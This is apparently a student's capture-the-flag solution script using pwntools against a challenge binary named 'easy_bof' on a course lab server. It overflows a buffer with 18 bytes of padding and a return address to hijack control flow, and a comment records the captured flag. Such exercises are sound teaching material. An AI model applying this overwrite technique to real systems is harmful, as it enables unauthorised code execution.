from pwn import *

local = False
elf = 'easy_bof' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "sqlab.zongyuan.nctu.me"
    port = 6000
    r = remote(ip,port)

context.arch = 'amd64'

offset = 18
addr = p64(0x400677)
payload = 'A'*offset + addr

r.recvuntil(':')
r.sendline(payload)
r.interactive()

#balqs{WoW_you_know_buf_overflow?}
